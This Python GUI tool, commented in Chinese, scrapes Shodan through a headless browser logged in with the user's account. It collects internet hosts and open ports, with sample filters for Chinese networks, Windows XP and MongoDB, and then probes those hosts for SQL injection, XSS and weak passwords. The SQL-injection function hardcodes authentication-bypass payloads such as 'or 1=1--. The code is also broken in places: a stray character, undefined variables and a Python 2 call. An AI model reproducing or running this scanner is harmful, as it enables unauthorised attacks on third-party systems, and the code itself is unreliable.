from threading import Timer
import tkinter as tk
from tkinter import ttk
import webbrowser
from tkinter import messagebox
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
import os
import json
import pandas
import time
import urllib
import requests
import sys
import xlsxwriter

# Environment settings
BASE_URL = "https://account.shodan.io"
SEARCH_URL = "https://www.shodan.io/"
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--window-size=1920x1080")
chrome_driver = os.getcwd() + "\\chromedriver.exe"

driver = webdriver.Chrome(chrome_options=chrome_options, executable_path=chrome_driver)

# user_state to check if user is login or something else
user_state = ""
sql_result = 0
xss_result = 0
acc_result = 0


# define progress bar
class ProgressBar(tk.Tk):
    def __init__(self, *args, **kwargs):
        tk.Tk.__init__(self, *args, **kwargs)
        self.progress = ttk.Progressbar(mainpage, orient="horizontal", length=400, mode="indeterminate")
        self.progress.place(x=100, y=500)
        self.val = 0
        self.max_val = 1
        self.progress["maximum"] = 1

    def updating(self, val):
        self.val = val
        self.progress["value"] = self.val

        if self.val == self.max_val:
            self.destroy()


# complete shutdown the applications
def shutdown():
    driver.quit()
    mainpage.destroy()


# show the old data which hadn't been deleted
def check_all():
    all_ip_dict = "all_ip_dict_json"
    if os.path.exists("all_ip_dict_json"):
        with open(all_ip_dict, 'r') as inputfile:
            ipdict = json.load(inputfile)

    # show the selected ip address's detail
    def onselectall(evt):

        w = evt.widget
        index = str(w.curselection()[0])

        detail_dict = ipdict[index]['detail']
        lb_detail.delete(0, 'end')

        lb_detail.insert('end', ipdict[index]['ip_name'])
        lb_detail.insert('end', '\n')
        lb_detail.insert('end', "PORTS:")
        port_list = list()
        port_list = ipdict[index]['ports'].split(', ')
        lb_detail.insert('end', *port_list)
        lb_detail.insert('end', '\n')
        for i in detail_dict:
            lb_detail.insert('end', '{}:{}'.format(i, detail_dict[i]))
        lb_detail.place(x=230, y=30)

    # delete all the data
    def data_del():
        lb_ip.delete(0, 'end')
        lb_detail.delete(0, 'end')
        if os.path.exists("all_ip_dict_json"):
            os.remove("all_ip_dict_json")

    # export all the data to the excel to let user clearly know what's the result
    def data_out():
        try:
            os.mkdir("匯出資料")
        except FileExistsError:
            pass
        if os.path.exists('all_ip_dict_json'):
            with open('all_ip_dict_json', 'r') as inputfile:
                ipdict = json.load(inputfile)
            os.chdir("匯出資料")
            if os.path.exists('ip_紀錄.xlsx'):
                os.remove('ip_紀錄.xlsx')
            workbook = xlsxwriter.Workbook('ip紀錄.xlsx')
            worksheet = workbook.add_worksheet()
            bold = workbook.add_format({'bold': 1})

            worksheet.set_column(0, 0, 15)
            worksheet.set_column(1, 1, 15)
            worksheet.set_column(2, 2, 40)

            worksheet.write('A1', 'IP位置', bold)
            worksheet.write('B1', 'IP名字', bold)
            worksheet.write('C1', '埠位', bold)
            worksheet.write('D1', '弱密碼測試', bold)
            worksheet.write('E1', 'SQL測試', bold)
            worksheet.write('F1', 'XSS測試', bold)
            #            worksheet.write('E1', '細節', bold)
            row = 1
            col = 0
            for item in ipdict.keys():
                #                temp_dict =
                worksheet.write_string(row, col, ipdict[item]['ip_address'])
                worksheet.write_string(row, col + 1, ipdict[item]['ip_name'])
                worksheet.write_string(row, col + 2, ipdict[item]['ports'])
                worksheet.write_string(row, col + 3, ipdict[item]['acc_result'])
                worksheet.write_string(row, col + 4, ipdict[item]['sql_result'])
                worksheet.write_string(row, col + 5, ipdict[item]['xss_result'])
                row += 1
            workbook.close()
            os.chdir("..")
        else:
            messagebox.showinfo("錯誤!", "沒有紀錄,請先測試過弱密碼測試在做紀錄")

    ip_dict = {}
    chk_ip_page = tk.Toplevel(mainpage)
    chk_ip_page.geometry('600x400')
    chk_ip_page.title('檢視歷史所有ip')
    chk_ip_page.iconbitmap('icon.ico')

    if os.path.exists('all_ip_dict_json'):
        with open('all_ip_dict_json', 'r') as inputfile:
            ip_dict = json.load(inputfile)

    lb_ip = tk.Listbox(chk_ip_page,
                       width=30, height=18)
    for ip_count in ip_dict.keys():
        lb_ip.insert(ip_count, ip_dict[ip_count]['ip_address'])
    lb_detail = tk.Listbox(chk_ip_page, width=50, height=18)
    lb_ip.place(x=0, y=30)
    lb_ip.bind('<<ListboxSelect>>', onselectall)

    btn_out = tk.Button(chk_ip_page, text='匯出', command=data_out, width=50)
    btn_out.place(x=110, y=330)

    btn_del = tk.Button(chk_ip_page, text='刪除', command=data_del, width=50)
    btn_del.place(x=110, y=360)


# if select anyone of ip address show the ip's detail
def onselect(evt):
    ip_json = "ip_json"
    with open(ip_json, 'r') as inputfile:
        ipdict = json.load(inputfile)

    w = evt.widget
    index = str(w.curselection()[0])

    detail_dict = ipdict[index]['detail']

    lb_detail = tk.Listbox(mainpage, width=50, height=20)
    lb_detail.insert('end', ipdict[index]['ip_name'])
    lb_detail.insert('end', '\n')
    ports_list = ipdict[index]['ports'].split(', ')
    for i in detail_dict:
        lb_detail.insert('end', '{}:{}'.format(i, detail_dict[i]))
    lb_detail.insert('end', '\n')
    lb_detail.insert('end', 'ports:')
    for i in ports_list:
        lb_detail.insert('end', i)
    lb_detail.place(x=230, y=100)


login_state = 0


# login function is successed, use webdriver to open shodan
#   then check the user's account is correct or not
#   and then change the global var. which is login_status
def func_login():
    sign_up_page = tk.Toplevel(mainpage)
    sign_up_page.geometry('350x200')
    sign_up_page.title('登入畫面')
    sign_up_page.iconbitmap('icon.ico')

    def func_login_action():
        input_account = input_user_name.get()
        input_password = input_user_password.get()

        driver.get(BASE_URL + "/login")
        driver.find_element_by_xpath("//input[@id='username']").send_keys(input_account)
        driver.find_element_by_xpath("//input[@id='password']").send_keys(input_password)
        driver.find_element_by_xpath("//input[@name='login_submit']").submit()

        if driver.current_url == "https://account.shodan.io/login":
            messagebox.showinfo('錯誤!', "請重新確認您的帳號密碼是否輸入正確")
        else:
            messagebox.showinfo('成功!', '你已經成功登入shodan!')
            global login_state
            login_state = 1

        if login_state == 1:
            driver.get("https://developer.shodan.io/dashboard")
            page_html = driver.page_source
            page_soup = BeautifulSoup(page_html, 'html.parser')
            global user_state
            user_state = page_soup.find("h2").text
            login_status.config(text="登入狀況:成功" + '\n' +
                                     "登入者帳號為:" + input_account + '\n' +
                                     "此帳號為" + user_state)
            sign_up_page.destroy()

    #    #l.config(text='登入畫面跳出')

    input_user_name = tk.StringVar()
    input_user_name.set('')
    tk.Label(sign_up_page,
             text='請輸入帳號: ').place(x=50, y=10)
    entry_new_name = tk.Entry(sign_up_page,
                              textvariable=input_user_name)
    entry_new_name.place(x=150, y=10)

    input_user_password = tk.StringVar()
    input_user_password.set('')
    tk.Label(sign_up_page, text='請輸入密碼: ').place(x=50, y=40)
    entry_new_password = tk.Entry(sign_up_page,
                                  textvariable=input_user_password,
                                  show="*")
    entry_new_password.place(x=150, y=40)

    btn_confirm_sign_up = tk.Button(sign_up_page,
                                    text='確定輸入',
                                    command=func_login_action)
    btn_confirm_sign_up.place(x=150, y=130)


def func_submit():
    url = 'https://account.shodan.io/register'
    webbrowser.open_new(url)-


# Cross-Sites scripting test
def xss_test():
    fname = "payloads.txt"
    with open(fname) as f:
        content = f.readlines()
    # you may also want to remove whitespace characters like `\n` at the end of each line
    payloads = [x.strip() for x in content]
    url = input("URL: ")
    vuln = []
    for payload in payloads:
        payload = payload
        xss_url = url + payload
        r = requests.get(xss_url)
        if payload.lower() in r.text.lower():
            print("Vulnerable: " + payload)
            if (payload not in vuln):
                vuln.append(payload)
        else:
            print("Not vulnerable!")

    print("--------------------\nAvailable Payloads:")
    print('\n'.join(vuln))


# sql injection test
def sql_injection():
    full_url = input("Url: ")
    error_msg = "You have an error in your SQL syntax"
    payloads = ["'admin'or 1=1 or ''='",
                "'=1\' or \'1\' = \'1\'",
                "'or 1=1",
                "'1 'or' 1 '=' 1",
                "'or 1=1#",
                "'0 'or' 0 '=' 0",
                "'admin'or 1=1 or ''='",
                "'admin' or 1=1",
                "'admin' or '1'='1",
                "'or 1=1/*",
                "'or 1=1--"]  # whatever payloads you want here ## YOU CAN ADD YOUR OWN
    errorr = "yes"
    body = ""
    for payload in payloads:
        try:
            payload = payload
            resp = urllib.urlopen(fullurl + payload)
            body = resp.read()
        except:
            print("[-] Error! Manually check this payload: " + payload)
            errorr = "no"
            sys.exit()
        if errormsg in body:
            if errorr == "no":
                print("[-] That payload might not work!")
                errorr = "yes"
            else:
                print("[+] The website is SQL injection vulnerable! Payload: " + payload)
        else:
            print("[-] The website is not SQL injection vulnerable!")


# main function of the application, using the user's input to parse the shodan website
def func_filter():
    #    class Checkbar(tk.Frame):
    #        def __init__(self, parent=None, picks=[]):
    #          tk.Frame.__init__(self, parent)
    #          self.vars = []
    #         for pick in picks:
    #            var = tk.IntVar()
    #             chk = tk.Checkbutton(self, text=pick, variable=var)
    #             chk.pack()
    #             self.vars.append(var)
    #        def state(self):
    #            return map((lambda var: var.get()), self.vars)
    def func_test():
        try:
            os.path.isdir("測試")
        except FileNotFoundError:
            messagebox.showinfo("警告!", "沒找到測試用之資料夾")
        os.chdir("測試")
        if os.path.isfile("xss_payloads.txt"):
            pass
        else:
            messagebox.showinfo("警告!", "xss_payloads檔案不存在,故xss會失敗")
        if os.path.isfile("sql_payloads.txt"):
            pass
        else:
            messagebox.showinfo("警告!", "sql_payloads檔案不存在,故sql injection會失敗")
        if os.path.isfile("account.txt"):
            pass
        else:
            messagebox.showinfo("警告!", "account檔案不存在,故弱密碼會失敗")

        # writing new ip into all ip_dict_json which record the history ip address and detail
        xss = ""
        acc = ""
        sql = ""
        #            print (list(sel_test.state()))
        global xss_result

        if xss_result == 1:
            xss = "成功"
        elif xss_result == 0:
            xss = "失敗"

        global sql_result
        if sql_result == 1:
            sql = "成功"
        elif sql_result == 0:
            sql = "失敗"

        global acc_result
        if os.path.isfile("account.txt"):
            if acc_result == 1:
                acc = "成功"
            else:
                acc = "失敗"
        else:
            messagebox.showinfo('錯誤!', '沒有讀取到測試用之帳號密碼')
            acc = "失敗"
        os.chdir("..")
        time.sleep(5)
        if os.path.exists("all_ip_dict_json"):
            with open("all_ip_dict_json", 'r') as inputfile:
                allipdict = json.load(inputfile)
            total_len = len(allipdict)
            for i in range(0, len(ip_dict)):
                ip_dict[i]["xss_result"] = xss
                ip_dict[i]["sql_result"] = sql
                ip_dict[i]["acc_result"] = acc
                allipdict[i + total_len] = ip_dict[i]
            with open("all_ip_dict_json", 'w') as outfile:
                json.dump(allipdict, outfile)
        else:
            with open("all_ip_dict_json", 'w') as outfile:
                for i in range(0, len(ip_dict)):
                    ip_dict[i]["xss_result"] = xss
                    ip_dict[i]["sql_result"] = sql
                    ip_dict[i]["acc_result"] = acc
                json.dump(ip_dict, outfile)

    #		def do_all_job():
    #			if os.path.exists("all_ip_dict_json"):
    #				with open("all_ip_dict_json", 'r') as inputfile:
    #					allipdict = json.load(inputfile)
    #				total_len = len(allipdict)
    #				for i in range(0,len(ip_dict)):
    #					ip_dict[i]["xss_result"]="失敗"
    #					ip_dict[i]["sql_result"]="失敗"
    #					ip_dict[i]["acc_result"]="失敗"
    #					allipdict[i+total_len] = ip_dict[i]
    #				with open("all_ip_dict_json", 'w') as outfile:
    #					json.dump(allipdict, outfile)
    #			else:
    #				with open("all_ip_dict_json", 'w') as outfile:
    #					for i in range(0,len(ip_dict)):
    #						ip_dict[i]["xss_result"]="失敗"
    #						ip_dict[i]["sql_result"]="失敗"
    ##						ip_dict[i]["acc_result"]="失敗"
    #					json.dump(ip_dict, outfile)
    #			test_page.destroy()
    #		test_page=tk.Toplevel(mainpage)
    #		test_page.geometry()
    #		test_page.title('測試選擇')
    #		test_page.iconbitmap('icon.ico')
    #

    #		btn_check = tk.Button(test_page,
    #                             text="測試",
    #                              command=do_job,
    #                              )
    #		btn_check.pack()
    #		btn_all_check = tk.Button(test_page,
    #                                 text="全部測試",
    #                                 command=do_all_job,
    #                                )
    #		btn_all_check.pack()

    new_filter = input_filter.get()
    temp_time_filter = input_time.get()
    time_filter = int(temp_time_filter)

    #    def progressbar_job():
    #        def test(i=0):
    #            time_round = time_filter*80
    #            app.updating(i/100)
    #            if i < 100:
    #                app.after(time_round, test, i+1)
    #
    #        app = progress_bar()
    #        app.after(1, test)
    #        app.mainloop()
    #    t = threading.Thread(target = progressbar_job)
    #    t.start()
    #

    ip_dict = {}
    port_list = list()
    ip_list = list()
    ip_name_list = list()

    if os.path.exists("all_ip_dict_json"):
        with open("all_ip_dict_json", 'r') as inputfile:
            allipdict = json.load(inputfile)
    else:
        allipdict = {}
    if int(time_filter) % 10 != 0:
        messagebox.showinfo("錯誤!", "輸入之搜尋資料必須為十之倍數")
        return
    if user_state.split(" ")[0] == "Free":
        if int(time_filter) > 20:
            messagebox.showinfo("錯誤!", "您的帳戶為免費，單次最大上限為20筆資料!")
            return
    if login_state == 1:  #
        driver.get(SEARCH_URL)
        # input filter and search in shodan
        driver.find_element_by_xpath("//input[@id='search_input']").send_keys(new_filter)
        driver.find_element_by_xpath("//Button[@class='btn btn-primary btn-small submit']").submit()

        # because everypage have 10 datasets so divide 10 to count how many pages need to be crawl
        for times in range(0, int(time_filter / 10)):
            # just crawling
            page_html = driver.page_source
            page_soup = BeautifulSoup(page_html, 'html.parser')
            page_findTAG = page_soup.find_all(class_="search-result")
            # because we have 10 datasets of every pages then we need to get everyone's ip address
            # so use double loop and using ip_list to record the ip_address
            if len(page_findTAG) < 10:
                messagebox.showinfo("錯誤", "發生未知之錯誤!")
                return
            for i in range(0, 10):  # len(page_findTAG)
                try:
                    for j in page_findTAG[i].find_all(class_="search-result-summary"):
                        if j.find(class_="details"):
                            ip_link = j.find(class_='details').get('href')
                            ip_list.append(ip_link.split('/')[2])
                        else:
                            messagebox.showinfo("錯誤!", "發生錯誤!請重新測試")
                            return
                    str_ip_name = page_findTAG[i].find(class_="ip").text
                    #                str_os = page_findTAG[i].find(class_="os").text
                    #                list_detail = page_findTAG[i].find('pre').text
                    #                str_detail =  "".join(str(x) for x in list_detail)

                    ip_name_list.append(str_ip_name)
                #                os_list.append(str_os)
                #                dt_list.append(str_detail)
                #                ip_dict[k]={
                #                            "ip_address":ip_list[k],
                #                            "ip_name": str_ip_name,
                #                            "os"     : str_os,
                #                            "detail" : "".join(str(x) for x in str_detail),
                #                       	 }
                except:
                    messagebox.showinfo("錯誤!", "搜尋資料時發生錯誤!")
                    return
            next_page = driver.find_element_by_link_text('Next')
            next_page.click()
        # crawling for ips' ports
        for j in range(0, time_filter):
            driver.get(SEARCH_URL + "/host/" + ip_list[j])
            page_html = driver.page_source
            page_soup = BeautifulSoup(page_html, 'html.parser')
            page_findIP = page_soup.find_all("meta", attrs={'name': 'twitter:description'}, content=True)
            port_list = list()

            page_findDT = page_soup.find("table", attrs={"class": "table"})
            td_list = list()
            th_list = list()
            for td_tags in page_findDT.find_all("td"):
                td_list.append(td_tags.get_text())
            for th_tags in page_findDT.find_all("th"):
                th_list.append(th_tags.get_text())

            dt_dict = dict(zip(td_list, th_list))
            #            print (dt_dict)
            for i in page_findIP:
                temp = str(i)
                step_1 = temp.split('Ports open: ')
                ports = step_1[1].split('"')
                port_list.append(ports[0])

            ip_dict[j] = {
                "ip_address": ip_list[j],
                "ip_name": ip_name_list[j],
                "detail": dt_dict,
                "ports": port_list[0],
            }

        with open("ip_json", 'w') as outfile:
            json.dump(ip_dict, outfile)

        lb_ip = tk.Listbox(mainpage,
                           width=30, height=20)
        for ip_count in ip_dict.keys():
            lb_ip.insert('end', ip_dict[ip_count]['ip_address'])
        lb_ip.place(y=100)
        lb_ip.bind('<<ListboxSelect>>', onselect)

        btn_test = tk.Button(mainpage,
                             text='進行測試',
                             command=func_test)
        btn_test.place(x=515, y=75)
        messagebox.showinfo("搜尋完成!", "搜尋完成囉!")
    else:
        messagebox.showinfo("警告!", "請先確認是否有登入成功!")


# background process, schedule and do the func_filter at designated times
def autofilter():
    new_filter = input_filter.get()
    temp_time_filter = input_time.get()
    time_filter = int(temp_time_filter)

    if state.get() == 1:
        if input_autotime.get():
            left_time = int(input_autotime.get())
            if new_filter and time_filter:
                go_filter = Timer(left_time * 60, func_filter)
                go_filter.start()
            #                    func_filter()

            #            if input_time.get():
            #                schedule.every(int(input_time.get())).minutes.do(func_filter)
            else:
                messagebox.showinfo("警告", "沒輸入查詢關鍵字")
        else:
            messagebox.showinfo("警告!", "請確認是否有輸入正確資料")


if __name__ == '__main__':
    # calling tk function to create a now geometry
    mainpage = tk.Tk()
    mainpage.title('主畫面')
    mainpage.geometry('600x600')
    mainpage.iconbitmap('icon.ico')

    # global login status record the user is login or not
    login_status = 0

    # show the user is login or not
    # if user input correct api then show login success
    # else if user doesn't login success or haven't input user api then show login unsuccess

    login_status = tk.Label(mainpage,
                            text='登入狀況:失敗')
    login_status.pack()

    # main page show a listbox record the filter which user input
    # havn't done:
    # first:user input the filter,
    # second:record the filters which user input in the past
    # third:record api and users relevance
    input_filter = tk.StringVar()
    input_time = tk.StringVar()
    input_filter.set('')
    input_time.set('')
    tk.Label(mainpage,
             text="請輸入要篩選之關鍵字:").place(x=50, y=50)
    entry_filter = tk.Entry(mainpage,
                            textvariable=input_filter,
                            width=25).place(x=180, y=50)
    input_autotime = tk.StringVar()
    input_new_time = tk.Entry(mainpage,
                              textvariable=input_autotime,
                              width=3)

    # 遞迴測試 multithread
    #    lb_time = tk.Label(mainpage,
    #                       text="分")
    #    input_new_time.place(x=180,y=75)
    #    lb_time.place(x=210,y=75)

    #    tk.Label(mainpage,
    #             text="遞迴搜尋:").place(x=225,y=75)
    #    state = tk.IntVar()
    #    loop_ck_btn = tk.Checkbutton(mainpage,
    #                                 variable = state,
    #                                 command=autofilter)
    #
    #    loop_ck_btn.place(x=285,y=73)

    tk.Label(mainpage,
             text="請輸入要搜尋之資料量:").place(x=350, y=50)

    entry_filter = tk.Entry(mainpage,
                            textvariable=input_time,
                            width=5).place(x=480, y=50)

    btn_filter = tk.Button(mainpage,
                           text="送出",
                           command=func_filter).place(x=525, y=47)

    lb_filter = tk.Listbox(mainpage,
                           width=50, height=8)
    lb_filter.place(x=120, y=440)

    lb_filter.insert('end', '1.搜尋特定ip之網段(以121.42為起頭之網段):')
    lb_filter.insert('end', 'net:121.42.0.0/16')
    lb_filter.insert('end', '2.搜尋特定國家(以中國大陸為例):')
    lb_filter.insert('end', 'country:"CN"')
    lb_filter.insert('end', '3.搜尋特定port(以80為例):')
    lb_filter.insert('end', 'port:"80"')
    lb_filter.insert('end', '4.搜尋某os系統(以Windows XP為例):')
    lb_filter.insert('end', 'os:"Windows XP"')
    lb_filter.insert('end', '5.搜尋特定城市(以北京為例):')
    lb_filter.insert('end', 'city:"Beijing"')
    lb_filter.insert('end', '6.搜尋特定網域(以edu為例):')
    lb_filter.insert('end', 'hostname:"edu"')
    lb_filter.insert('end', '7.搜尋特定產品(以mongodb為例):')
    lb_filter.insert('end', 'product:"mongodb"')

    # create menubar

    menubar = tk.Menu(mainpage)
    filemenu = tk.Menu(menubar, tearoff=0)
    menubar.add_cascade(label='檢視', menu=filemenu)
    filemenu.add_command(label='所有IP', command=check_all)
    filemenu.add_separator()
    filemenu.add_command(label='說明', command=tutorial)
    filemenu.add_command(label='關閉', command=shutdown)

    editmenu = tk.Menu(menubar, tearoff=0)
    menubar.add_cascade(label='設定', menu=editmenu)
    editmenu.add_command(label='登入', command=func_login)
    editmenu.add_separator()
    editmenu.add_command(label='註冊', command=func_submit)

    mainpage.config(menu=menubar)

    mainpage.mainloop()


